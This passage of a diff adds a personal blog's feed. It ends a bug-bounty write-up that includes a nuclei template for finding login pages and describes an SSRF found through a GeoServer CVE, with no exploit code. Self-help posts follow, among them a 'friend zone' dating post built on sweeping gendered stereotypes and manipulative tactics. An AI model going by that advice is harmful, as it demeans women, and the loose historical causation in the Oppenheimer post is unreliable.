+<p>I restarted in January 2024 and sent 5 reports to them which included critical issues, like Account Takeover, SSRF, XSS ..etc
+I was pretty much shocked when they said N/A in every report, but at last, I reported SSRF and it got accepted.</p>
+
+<h3 id="what-was-my-initial-approach">What was my initial Approach?</h3>
+
+<p>well, come back to the topic.</p>
+
+<p>1 — At first, I was going like other hackers i..e just to pick up any one asset from the <a href="https://gist.github.com/R0X4R/81e6c50c091a20b060afe5c259b58cfa">GitHub scope</a> list and start hacking on it.</p>
+
+<p>2 — When I was not getting results, I started the shortcut method i..e picked up assets that had already been tested before, So I went through all the medium articles where others told their stories of “Hacking into the Dutch Government” and picked up assets from their. Still not getting accepted.</p>
+
+<p>3 — When I came back to December 2023, I was focused on manual hacking, so that time I was focused more on account takeovers and authentication-based attacks, and luckily found an Account Takeover via CSRF attack in one of their servers, which they closed as N/A, I don’t know why ??</p>
+
+<p>4 — Then, I created a nuclei template to find and filters the subdomains which includes login/signup features. I tested about 3–4 web-application but nothing interesting was found. Most of them are restricted.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">LOGIN-SIGNUP</span>
+
+<span class="na">info</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Login/Signup Detection</span>
+  <span class="na">author</span><span class="pi">:</span> <span class="s">Prakhar0x01</span>
+  <span class="na">severity</span><span class="pi">:</span> <span class="s">info</span>
+  <span class="na">classification</span><span class="pi">:</span>
+    <span class="na">cpe</span><span class="pi">:</span> <span class="s">cpe:2.3:a:application:application:*:*:*:*:*:*:*:*</span>
+  <span class="na">metadata</span><span class="pi">:</span>
+    <span class="na">verified</span><span class="pi">:</span> <span class="kc">true</span>
+    <span class="na">max-request</span><span class="pi">:</span> <span class="m">4</span>
+    <span class="na">vendor</span><span class="pi">:</span> <span class="s">application</span>
+    <span class="na">product</span><span class="pi">:</span> <span class="s">application</span>
+    <span class="na">category</span><span class="pi">:</span> <span class="s">cms</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="s">tech,login,signup,forms</span>
+
+<span class="na">http</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">GET</span>
+    <span class="na">path</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">"</span>
+
+    <span class="na">redirects</span><span class="pi">:</span> <span class="kc">false</span>
+    <span class="na">max-redirects</span><span class="pi">:</span> <span class="m">0</span>
+    <span class="na">stop-at-first-match</span><span class="pi">:</span> <span class="kc">true</span>
+
+    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">or</span>
+    <span class="na">matchers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
+        <span class="na">words</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">Login'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">login'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">Sign</span><span class="nv"> </span><span class="s">In'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">Sign</span><span class="nv"> </span><span class="s">Up'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">Register'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">login-form'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">signup-form'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">register-form'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">signin'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">signup'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">create</span><span class="nv"> </span><span class="s">account'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">create_account'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">createaccount'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">Create</span><span class="nv"> </span><span class="s">Account'</span>
+          <span class="pi">-</span> <span class="s1">'</span><span class="s">Create_Account'</span>
+        <span class="na">condition</span><span class="pi">:</span> <span class="s">or</span>
+</code></pre></div></div>
+
+<ul>
+  <li>But this template is pretty much accurate.</li>
+</ul>
+
+<h3 id="how-i-found-ssrf-server-side-request-forgery">How I found <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">SSRF</a> (Server Side Request Forgery)</h3>
+<ul>
+  <li>At last, I got a subdomain where I just noticed some random <code class="language-plaintext highlighter-rouge">xml</code> data, it was not like a typical <code class="language-plaintext highlighter-rouge">404</code> demo page. (I forgot to take a screenshot of it). I was about to move on, but then i noticed something like <code class="language-plaintext highlighter-rouge">GeoServer</code>, I bruteforce and found the <code class="language-plaintext highlighter-rouge">/wms</code> directory, I looked into it → found a version → researched about it, and found out that the version is vulnerable to <a href="https://www.synacktiv.com/en/advisories/unauthenticated-server-side-request-forgery-crlf-injection-in-geoserver-wms"><code class="language-plaintext highlighter-rouge">CVE-2023–43795</code></a></li>
+  <li>
+    <p>I quickly tested the exploit and made POC of it, wrote the explanation, and reported it.</p>
+  </li>
+  <li>BTW, I can also achieve RCE through it, but it requires certain server conditions, hence I finalize to report SSRF only.</li>
+</ul>
+
+<p><img src="/assets/logos/ssrf.jpg" alt="ssrf" width="1000" height="auto" /></p>
+
+<h3 id="conclusion">Conclusion</h3>
+<p>Yes, hacking becoming hard nowadays cuz there is so much competition globally from various other great hackers and developers aren’t fools like before. But at the same time, you’ll get more attack surfaces like APIs, and Mob. application, IOS ..etc</p>
+
+<blockquote>
+  <p>“Sometimes you don’t need to be very smart or very hard-working, all you need is just not to Give Up”.</p>
+</blockquote>
+
+<h4 id="timeline">Timeline</h4>
+<ul>
+  <li>Reported -&gt; 23/Jan/2024</li>
+  <li>Fixed -&gt; 31/Jan/2024</li>
+  <li>Swag Recieved -&gt; 27/Mar/2024</li>
+</ul>]]></content><author><name>Prakhar0x01</name></author><category term="write-ups" /><summary type="html"><![CDATA[My experience of hacking into the dutch government and get rewarded “Dutch Government lousy T-Shirt”. In this blog post, i’ll explain all the technical part and non-technical parts of it.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Psychology of Motivation</title><link href="http://localhost:4000/mindset/2024/03/10/Motivation/" rel="alternate" type="text/html" title="Psychology of Motivation" /><published>2024-03-10T00:00:00+05:30</published><updated>2024-03-10T00:00:00+05:30</updated><id>http://localhost:4000/mindset/2024/03/10/Motivation</id><content type="html" xml:base="http://localhost:4000/mindset/2024/03/10/Motivation/"><![CDATA[<blockquote>
+  <p>Motivation drives our actions and decisions in various ways. From societal expectations to personal ambitions, understanding the different aspects of motivation can help you channel it effectively. This guide explores the philosophy and psychology behind motivation and offers insights into overcoming common challenges.</p>
+</blockquote>
+
+<h3 id="society-definition">Society Definition:</h3>
+<ul>
+  <li>Propels you to action in a specific direction.</li>
+  <li>Eg. School –&gt; Good College –&gt; Good Job –&gt; Marriage –&gt; Kids –&gt; Trips, etc.</li>
+</ul>
+
+<h3 id="internet-definition">Internet Definition:</h3>
+<ul>
+  <li>Propels you to do things that matter.</li>
+  <li>Eg. Things which are serious (mostly) like doing workouts, trading, going hard, etc.</li>
+</ul>
+
+<h3 id="prakhar-gupta-definition">Prakhar Gupta Definition:</h3>
+<ul>
+  <li>Propels you to actions, whatever the action may be, even the worst.</li>
+  <li>Motivation is completely an internal drive; it is a biopsychological phenomenon.</li>
+  <li>Eg. Bunking classes to chill, thinking constantly about sex or pornographic content.</li>
+</ul>
+
+<h3 id="motivation--pubg-vs-your-life">Motivation : PUBG v/s Your Life</h3>
+
+<ul>
+  <li>Game with start &amp; end.</li>
+  <li>Game with victory.</li>
+  <li>Certain understanding.</li>
+  <li>Requires you to win sometimes.</li>
+  <li>Play against equally competent people.</li>
+  <li>Sharing experiences with people.</li>
+</ul>
+
+<h3 id="science-sapolskys-monkey-experiment">Science [<a href="https://en.wikipedia.org/wiki/Robert_Sapolsky">Sapolsky’s</a> Monkey Experiment]</h3>
+
+<ol>
+  <li>Motivation is in anticipation of reward (not exactly the reward).</li>
+  <li>There needs to be a fixed game.</li>
+  <li>Monkey needs to understand the game (Mastery).</li>
+  <li>Need an element of ‘Maybe’ (50% more motivation than anticipation).</li>
+</ol>
+
+<ul>
+  <li>This is the reason internet motivational speakers are doing so well; they make normal users (at least for a second/day/week) think that they might get what they’re going after. This is the entire phenomenon of Internet Motivation.</li>
+  <li>They create an image that ‘you can do it’ and paint a story of how you will feel. As a result, your brain processes it continuously through mirror neurons for a day or a week and then it disappears.</li>
+</ul>
+
+<h3 id="why-arent-you-motivated">Why Aren’t You Motivated?</h3>
+
+<ul>
+  <li>Imagine a second that occupies your head, that one thing you want to do but do not have enough motivation to do it. Think about it.</li>
+  <li>
+    <p>So the difference between PUBG and the thing you want to do is:</p>
+
+    <ol>
+      <li>In PUBG, the game is clear, but in your case, life is not clear! So either most people live their life on someone else’s blueprint or they just let circumstances beat them.</li>
+      <li>In PUBG, you desire to play, but in your case, you operate under pressure, not desires.</li>
+      <li>In PUBG, there is a fixed time to get feedback, but in your case, it is a too-long feedback loop. As a result, people start losing interest, and then a new game comes out, i.e., Distractions.</li>
+      <li>Distractions –&gt; People are more interested in the consequences of their actions than the actions themselves.</li>
+    </ol>
+  </li>
+  <li>Eg. If you were not respected in your childhood, and now you have friends who respect you but are too much into parties and chilling, on the other hand, there is another option to get respect by doing UPSC. So, by default, you’re more interested in ‘getting respected’ than the option or the way you get it.</li>
+</ul>
+
+<h3 id="mind-altering-perspectives-on-motivation">Mind-Altering Perspectives on Motivation</h3>
+
+<ol>
+  <li><strong>INSPIRATION</strong></li>
+</ol>
+
+<ul>
+  <li>When you talk to someone, one of the functions that you accomplish is to understand the model of reality they inhabit. You try to understand how they pieced out different parts of life and how they can fit those parts so that you could repeat the same.</li>
+  <li>Eg. <a href="https://en.wikipedia.org/wiki/Ekalavya">Eklavya’s</a> Story.</li>
+  <li>Sometimes the problem is not having motivation; sometimes the problem is that you do not have the map of the problem, i.e., inspiration.</li>
+  <li>The majority of people are living an NPC life, where they just blindly follow trends and want to escape from what they have instead of admitting what they have.</li>
+</ul>
+
+<ol>
+  <li><strong>MOTIVATION</strong></li>
+</ol>
+
+<ul>
+  <li>Define motivation as excellence, not success.</li>
+  <li>
+    <p>Eg. In <em>3 Idiots</em>, Raju is running behind success (family pressure) whereas Rancho is running behind excellence.</p>
+
+    <ul>
+      <li>So, under family pressure, Raju becomes so blinded that he puts multiple rings on his hands, bargains results from God rather than actually worshiping, and has no freedom, submission, or surrender in life.</li>
+      <li>Whereas Rancho feels so much independence, freedom, and submission in his pursuit.</li>
+      <li>Hence, Rancho says to Raju, “Do not run after success; instead, run after excellence!”</li>
+    </ul>
+  </li>
+  <li>Orient yourself towards excellence, define yourself in terms of excellence, and you’ll do much better. Because then you’re not acting under outside pressure; you’re internally submitted/surrendered.</li>
+</ul>
+
+<ol>
+  <li><strong>TRACKS</strong></li>
+</ol>
+
+<ul>
+  <li>Every meaningful thing requires confusion, effort, and sacrifices.</li>
+  <li>
+    <p>Quote by Harmozi:</p>
+
+    <blockquote>
+      <ul>
+        <li>“What you cannot measure, you cannot predict; what you cannot predict, you cannot beat.”</li>
+      </ul>
+    </blockquote>
+  </li>
+  <li>So, track your progress by splitting your end goals journey into multiple short goals and start acting upon them.</li>
+  <li>You need discipline, consistency, and the ability to overcome your urges to avoid boring work.</li>
+  <li>In conclusion, if you’re not disciplined enough, you’re not strong!</li>
+</ul>
+
+<ol>
+  <li><strong>DETERMINATION</strong></li>
+</ol>
+
+<ul>
+  <li>It’s a play of strength.</li>
+  <li>Things happen in life with no regard to what you want –&gt; Breakups, deaths, parties, loss, distractions, conflicts.</li>
+  <li>Determination is the test of your character, and you shouldn’t give up!</li>
+  <li>Every time you get bored of doing that stuff, push yourself double that day. Very simply said.</li>
+</ul>
+
+<h3 id="conclusion">Conclusion</h3>
+<blockquote>
+  <p>Understanding motivation involves recognizing its different dimensions—from societal expectations to personal drives. By focusing on excellence, tracking progress, and building determination, you can harness motivation more effectively and overcome common obstacles.</p>
+</blockquote>
+
+<h3 id="references">References</h3>
+
+<p><a href="https://www.youtube.com/watch?v=vnb-925_zig">Motivation: Why you never have enough</a></p>]]></content><author><name>Prakhar0x01</name></author><category term="Mindset" /><summary type="html"><![CDATA[Motivation drives our actions and decisions in various ways. From societal expectations to personal ambitions, understanding the different aspects of motivation can help you channel it effectively. This guide explores the philosophy and psychology behind motivation and offers insights into overcoming common challenges.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Philosophy of Reality</title><link href="http://localhost:4000/mindset/2024/02/01/Reality/" rel="alternate" type="text/html" title="Philosophy of Reality" /><published>2024-02-01T00:00:00+05:30</published><updated>2024-02-01T00:00:00+05:30</updated><id>http://localhost:4000/mindset/2024/02/01/Reality</id><content type="html" xml:base="http://localhost:4000/mindset/2024/02/01/Reality/"><![CDATA[<blockquote>
+  <p>Reality is a multifaceted concept which is more than just what we see or experience. It consists of different layers, from objective facts to subjective interpretations. This guide explores the various dimensions of reality and how they influence our understanding of the world.</p>
+</blockquote>
+
+<h2 id="reality">REALITY</h2>
+
+<p>Definition:</p>
+<ul>
+  <li>1) A thing that is actually experienced, not just imagined, or</li>
+  <li>2) The way life really is, not the way it may appear to be or how you would like it to be.</li>
+</ul>
+
+<h3 id="model">MODEL</h3>
+
+<ul>
+  <li>The model has 4 layers:
+    <ul>
+      <li>1 : Objective Reality</li>
+      <li>2 : Perceptual Reality</li>
+      <li>3 : Subjective Reality</li>
+      <li>4 : Consensual Reality</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="objective-reality">OBJECTIVE REALITY</h3>
+<ul>
+  <li>Reality that is described in math, physics.</li>
+  <li>We do not observe this reality, but it always exists around us.</li>
+  <li>In human senses, some common examples are smelling, looking, hearing.</li>
+  <li>E.g., Protons, Neutrons, gravity, Thermodynamics.</li>
+</ul>
+
+<h3 id="perceptual-reality">PERCEPTUAL REALITY</h3>
+<ul>
+  <li>It is the level of reality where neuroscience &amp; psychology make sense of reality.</li>
+  <li>Philosophy of Plato (The Platonic theory of forms), Plato’s allegory of the cave –&gt; All these fundamentals are described at the level of perception or at the level that you can perceive.</li>
+  <li>Evolutionary theory (by ~ Donald Hoffman):
+    <ul>
+      <li>He says evolution never tells you the whole reality; instead, it only tells you the functional reality, so that you can survive.</li>
+      <li>He says that whenever we see icons like Instagram, Facebook, these icons are not actually apps; they are representations of the app.</li>
+      <li>Similarly, the 5 senses of humans are representations of reality, not the actual reality.</li>
+    </ul>
+  </li>
+  <li>Hence, the difference between Objective reality and Perceptual reality is like the difference between Instagram icons and the Instagram app.</li>
+  <li>This perceptual input is generally very cognitive (mental activities) overwhelming –&gt; Orientation filter (when you understand reality beyond perceptual sense).</li>
+  <li>In this reality, the orientation filter allows you to interpret the raw data of perceptual reality.</li>
+</ul>
+
+<h3 id="subjective-reality">SUBJECTIVE REALITY</h3>
+<ul>
+  <li>Every human being mostly lives in this reality.</li>
+  <li>In this reality, the orientation filter allows you to interpret the raw data of perceptual reality and make sense of it using a story, using an orientation, using judgments.</li>
+  <li>For example -&gt; If you are in a completely white room with no objects, you’ll either sit at the corner of the room or at the center of the room (because your taste is associated with corner &amp; center but not the awkward middle position between corner &amp; center).</li>
+  <li>Hence, you build various micro-associations with this raw data, and when many of these micro-associations stack up together, they lead to stories.</li>
+  <li>This is the level where you have a perspective on reality.
+    <ul>
+      <li>E.g., People go outside &amp; seek perspectives &amp; advice from others.</li>
+    </ul>
+  </li>
+  <li>Hence, there is a filter of the ‘value’ on each of your perspectives.
+    <ul>
+      <li>So, every time you have any problem statement, evaluate the value/association related to it.</li>
+      <li>For instance, if you have a problem statement: “I used to love this girl but she left me..”
+        <ul>
+          <li>1) If ‘value’ is associated with her existence with you, then it is bad.</li>
+          <li>2) If ‘value’ is associated with your mental peace/well-being, then it is great that she left you.</li>
+          <li>3) If ‘value’ is associated with your career, parents, goals, then there is no such effect of her on you. In short, you don’t care.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>In subjective reality, all stories exist, hence all perspectives, advice, self-help, and spirituality also exist here. All mental frameworks, all masturbatory content exist here.</li>
+  <li>This is the level where we live most of the time. Notice that you have a constant ongoing story of yourself in which you’re the hero.</li>
+  <li>In Hindu culture, this is said to be ‘Maya.’</li>
+  <li>In Buddhist culture, this is said to be ‘Nothingness.’</li>
+</ul>
+
+<h3 id="consensual-reality">CONSENSUAL REALITY</h3>
+<ul>
+  <li>There is a constant process of negotiation between the subjectivities of each other (or intersubjectivity or consensual reality). This is the level we agree upon &amp; act on it.</li>
+  <li>For example, politics:
+    <ul>
+      <li>Prakhar thinks that Donald Trump should be the next President, on the other hand, Sandeep thinks that Biden should be the next president. As a result, the personality who has more votes will be the winner, and now civilians have to agree on the result regardless.</li>
+      <li>This is where advertising moves, money moves, power moves; this is where attention moves.</li>
+    </ul>
+  </li>
+  <li>We come to our consensus in our subjectivities &amp; we decide that this is the reality we should agree upon, and it is at this level that we have to behave, act, &amp; perform.
+    <ul>
+      <li>For example : In Prakhar’s mind, social media is bullshit, but in a creator’s mind, social media is the way to generate money. So, the consensual reality is that social media is used to generate money; hence Prakhar is pointless, and now the creator is dominant.</li>
+    </ul>
+  </li>
+  <li>This is where all red-pill metaphors exist, matrix (Andrew Tate), no-fap.</li>
+</ul>
+
+<h2 id="placing-items-of-your-reality">PLACING ITEMS OF YOUR REALITY</h2>
+
+<ol>
+  <li><strong>Self-Help</strong> : It moves you from perceptual reality to subjective reality.</li>
+  <li><strong>Meditative Spirituality</strong> : From subjective reality to perceptual reality.</li>
+  <li><strong>Politics</strong> : Subjective reality to perceptual reality (It asks you to interpret society from the view of power in a specific way).</li>
+  <li><strong>Psychology &amp; Neuroscience</strong> : From Objective reality to perceptual reality (raw perceptual data).</li>
+  <li><strong>Trauma</strong> : Subjective reality to perceptual reality. Always stuck between subjective reality. (Unconscious process).</li>
+  <li><strong>Psychedelics</strong> : It always moves from subjective reality to perceptual reality but eventually comes back to subjective reality.</li>
+  <li><strong>AR &amp; VR (Augmented &amp; Virtual Reality)</strong> : Already exists in different dimensions.</li>
+</ol>
+
+<ul>
+  <li>2D reality in 2D space : Instagram/Twitter</li>
+  <li>3D reality in 2D space : PUBG/COD/FORTNITE</li>
+  <li>3D reality in 3D space : Apple Glasses (Oculus)</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+<blockquote>
+  <p>Reality is a complex construct involving multiple layers of perception and understanding. By exploring the different dimensions of reality—from objective facts to consensual agreements—we can gain a deeper insight into how we perceive and interact with the world.</p>
+</blockquote>
+
+<h3 id="references">References</h3>
+
+<p><a href="https://www.youtube.com/watch?v=lmxy93ibM2M">The Philosophy of Reality</a></p>]]></content><author><name>Prakhar0x01</name></author><category term="Mindset" /><summary type="html"><![CDATA[Reality is a multifaceted concept which is more than just what we see or experience. It consists of different layers, from objective facts to subjective interpretations. This guide explores the various dimensions of reality and how they influence our understanding of the world.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">FriendZone : The wrong Investment.</title><link href="http://localhost:4000/mindset/2023/12/30/FriendZone/" rel="alternate" type="text/html" title="FriendZone : The wrong Investment." /><published>2023-12-30T00:00:00+05:30</published><updated>2023-12-30T00:00:00+05:30</updated><id>http://localhost:4000/mindset/2023/12/30/FriendZone</id><content type="html" xml:base="http://localhost:4000/mindset/2023/12/30/FriendZone/"><![CDATA[<blockquote>
+  <p>The FriendZone is a common yet complex scenario where emotional investment doesn’t lead to a romantic relationship. Understanding the dynamics at play, from chemistry to personal preferences, can help you approach relationships with greater clarity and confidence. By expressing your intentions early and maintaining a balanced perspective, you can improve your chances of moving beyond the FriendZone and forming a deeper connection.</p>
+</blockquote>
+
+<h2 id="friend-zone">Friend Zone</h2>
+<blockquote>
+  <p><strong>suffer mostly men, because women are mainly “friends with benefits” (any kind of)’</strong></p>
+</blockquote>
+
+<ul>
+  <li>
+    <p><strong>Definition:</strong> When a guy gives, gives, and gives for a very long time emotionally available, attentive, solving all her problems, and being the giver, until he finally tells her, “I like/love you!” and she looks back at him and says, “Listen, I like you too, but as a friend!” This often wrecks the guy.</p>
+  </li>
+  <li>
+    <p>Friend zone truly shakes up the guys and the things around him.</p>
+  </li>
+</ul>
+
+<h2 id="why-does-the-friend-zone-happen">Why Does the Friend Zone Happen?</h2>
+
+<ul>
+  <li>
+    <p><strong>You’re not just attractive enough</strong> (rejection).</p>
+  </li>
+  <li><strong>Unable to ‘Fit In’</strong> (women call it ‘chemistry’):
+    <ul>
+      <li>Women might feel that the guy is giving more friendly vibes than romantic vibes.</li>
+    </ul>
+  </li>
+  <li><strong>Not her ‘type’</strong> (Rejection):
+    <ul>
+      <li>Various conditions like she might have recently broken up with her ex, family doesn’t approve, career, etc.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="chemistry">Chemistry</h2>
+
+<ul>
+  <li>
+    <p><strong>Chemistry</strong> is what a women might say she didn’t find when she is about to friend zone you.</p>
+  </li>
+  <li>
+    <p>Chemistry is the ability to get her heart/attention and play with it in reality.</p>
+  </li>
+</ul>
+
+<h3 id="how-to-get-her-attentionheart"><strong>How to get her attention/heart?</strong></h3>
+
+<ol>
+  <li><strong>Express Your Intent Early:</strong> Includes giving compliments/flirting, etc.</li>
+  <li>
+    <p><strong>Being a Bad Boy (or less nice):</strong> Girls psychologically want men better than them. If a man is blindly accommodating for her, she may not be interested because he then becomes cheap to her.</p>
+
+    <ul>
+      <li>You can disagree with her sometimes (not always).</li>
+      <li>Don’t always be available for her.</li>
+      <li>Tease her.</li>
+    </ul>
+  </li>
+  <li><strong>Adventure:</strong> Shared emotional reality; go on actual dates rather than always sipping coffee or chatting/calling.</li>
+  <li><strong>Be a Fast-Moving Man:</strong> A man should have both passion and drive (indirect tension builder).</li>
+  <li><strong>Play:</strong> Laugh with her or crack jokes about illogical things.</li>
+  <li><strong>Tell a Good Story:</strong> Shared emotional reality (pinnacle art of conversation).</li>
+  <li><strong>Provide Exclusive Access:</strong> Invite her to parties, rides, or offer emotional support by asking about her insecurities.</li>
+</ol>
+
+<h2 id="strategy-for-men">Strategy for Men</h2>
+
+<ul>
+  <li>
+    <p><strong>Express Intent in 1-4 Weeks:</strong> Or after you’ve had sufficient interaction.</p>
+  </li>
+  <li>
+    <p><strong>Express as Much as You Feel:</strong> In the dating economic world, where you’re negotiating for each other’s company, overcommitting or over-bargaining undervalues yourself.</p>
+  </li>
+  <li>
+    <p><strong>Ask the Woman What Kind of Man She Likes:</strong> Most likely, she’ll describe the most obvious qualities about you. If she doesn’t, you should move on.</p>
+  </li>
+  <li>
+    <p><strong>Don’t Be Afraid of Losing Her:</strong> Being afraid of losing her can lead to becoming a bad negotiator, which can result in bad chemistry or no chemistry, leading to rejection.</p>
+  </li>
+</ul>
+
+<h3 id="conclusion">Conclusion</h3>
+<blockquote>
+  <p>Navigating the FriendZone can be challenging and emotionally taxing. Understanding the dynamics at play, from chemistry to personal preferences, can help you approach relationships with greater clarity and confidence. By expressing your intentions early and maintaining a balanced perspective, you can improve your chances of moving beyond the FriendZone and forming a deeper connection.</p>
+</blockquote>
+
+<h3 id="references">References</h3>
+
+<p><a href="https://www.youtube.com/watch?v=sXZxBdEKkQs">FriendZone : Solved</a></p>]]></content><author><name>Prakhar0x01</name></author><category term="Mindset" /><summary type="html"><![CDATA[The FriendZone is a common yet complex scenario where emotional investment doesn't lead to a romantic relationship. By expressing your intentions early and maintaining a balanced perspective, you can improve your chances of moving beyond the FriendZone and forming a deeper connection.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://picsum.photos/2560/600?image=733" /><media:content medium="image" url="https://picsum.photos/2560/600?image=733" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Philosophy of Oppenheimer</title><link href="http://localhost:4000/mindset/2023/12/30/Oppenheimer/" rel="alternate" type="text/html" title="Philosophy of Oppenheimer" /><published>2023-12-30T00:00:00+05:30</published><updated>2023-12-30T00:00:00+05:30</updated><id>http://localhost:4000/mindset/2023/12/30/Oppenheimer</id><content type="html" xml:base="http://localhost:4000/mindset/2023/12/30/Oppenheimer/"><![CDATA[<blockquote>
+  <p>Explore the philosophical insights of J. Robert Oppenheimer, focusing on his study of the Bhagavad Gita and the concept of consequences. Delve into the differences between external and internal consequences, and how they shaped Oppenheimer’s views on his role in creating the atomic bomb. Understand the interplay of karma and dharma in both personal and global contexts.</p>
+</blockquote>
+
+<h2 id="philosophy-of-oppenheimer">Philosophy of <a href="https://en.wikipedia.org/wiki/J._Robert_Oppenheimer">Oppenheimer</a></h2>
+
+<ol>
+  <li><a href="https://en.wikipedia.org/wiki/J._Robert_Oppenheimer">Oppenheimer</a> studied the Bhagavad Gita.</li>
+  <li>People mainly live in a <strong>cause and effect world.</strong></li>
+</ol>
+
+<h3 id="what-are-consequences">What are Consequences?</h3>
+
+<ul>
+  <li><strong>Consequences are of two natures:</strong>
+    <ol>
+      <li><strong>External Consequences:</strong>
+        <ul>
+          <li>When your actions <strong>impact the external world</strong>. (Eg. Arjun asks Krishna how he can fight his own siblings.)</li>
+        </ul>
+      </li>
+      <li><strong>Internal Consequences:</strong>
+        <ul>
+          <li>When you do something and consider its <strong>effect on yourself.</strong></li>
+        </ul>
+      </li>
+    </ol>
+  </li>
+</ul>
+
+<h3 id="1-external-consequences">1) EXTERNAL CONSEQUENCES</h3>
+
+<ul>
+  <li>Oppenheimer’s creation led to the destruction of Japan.</li>
+  <li>Oppenheimer’s creation led to the end of WWII.</li>
+  <li>Oppenheimer’s creation started the nuclear race (every country wanted nuclear bombs).</li>
+  <li>Oppenheimer’s creation started the Cold War between America and Russia.</li>
+  <li>Oppenheimer’s creation led to the Bay of Pigs and Cuba.</li>
+  <li>
+    <p>Oppenheimer’s creation led to the Vietnam War.</p>
+  </li>
+  <li>The further you go into the future, the more unrelated the consequences are. For example, the Vietnam War is a consequence of Oppenheimer’s nuclear creation.
+    <blockquote>
+      <p><strong>You can trace consequences historically but not prospectively.</strong></p>
+    </blockquote>
+  </li>
+  <li>
+    <p>This is known as the <strong><code class="language-plaintext highlighter-rouge">Order of Consequences</code></strong>.</p>
+  </li>
+  <li>As a result, every particular action has an ‘n’ number of consequences that cannot be predicted.</li>
+</ul>
+
+<h3 id="problem-of-consequences-in-external-reality">Problem of Consequences in External Reality</h3>
+
+<ul>
+  <li>Too many actions are happening simultaneously:
+    <ul>
+      <li>Every action has many degrees.</li>
+      <li>Additionally, many actions are occurring in parallel.</li>
+    </ul>
+  </li>
+  <li>Hence, reality is largely unpredictable externally (Eg. predicting the future, weather, results).</li>
+  <li>Similar to what Krishna said to Arjun: “Arjun, you should focus on karma rather than results. I (Krishna) am controlling the external reality of consequences.”</li>
+</ul>
+
+<h3 id="2-internal-reality">2) INTERNAL REALITY</h3>
+
+<ul>
+  <li>In Hinduism, this is referred to as “Karma.”</li>
+  <li><strong>Hindu belief:</strong> “You will get the consequences of your karma.”</li>
+  <li>It does not mean that God is making a list of your karma.</li>
+</ul>
+
+<h4 id="understanding-karma">Understanding Karma</h4>
+
+<ul>
+  <li>“Karma” refers to repeating your behavioral patterns until you get what you deserve.</li>
+</ul>
+
+<h4 id="problems-with-consequences-in-internal-reality">Problems with Consequences in Internal Reality</h4>
+
+<ul>
+  <li>Repetition</li>
+  <li>Recursion</li>
+</ul>
+
+<h4 id="understanding-dharma">Understanding Dharma</h4>
+
+<ul>
+  <li>“Dharma” is acting in a way that stops the duality of recursion.</li>
+  <li>In simple terms: “Dharma is the state when your ‘seer’ and ‘doer’ are the same.”</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<ul>
+  <li>Oppenheimer created the nuclear bomb for mainly two reasons:
+    <ol>
+      <li>He might have followed the <strong>INTERNAL REALITY</strong> philosophy, thinking, “I shouldn’t regret not making it or making the decision.”</li>
+      <li>Or, he might have followed the <strong>EXTERNAL REALITY</strong> philosophy, believing, “If I don’t make it, someone else will; if it’s not made this year, it will be made later.”</li>
+    </ol>
+  </li>
+</ul>
+
+<h2 id="conclusion-1">Conclusion</h2>
+<blockquote>
+  <p>Oppenheimer’s creation of the atomic bomb reflects his engagement with both external and internal consequences. His decisions, driven by the interplay of historical impact and personal philosophy, underscore the complex nature of consequence management. Whether guided by an external outlook on inevitability or an internal focus on personal responsibility, Oppenheimer’s actions reveal the profound and often unpredictable effects of human choices on both global and individual scales.</p>
+</blockquote>
+
+<h3 id="references">References</h3>
+
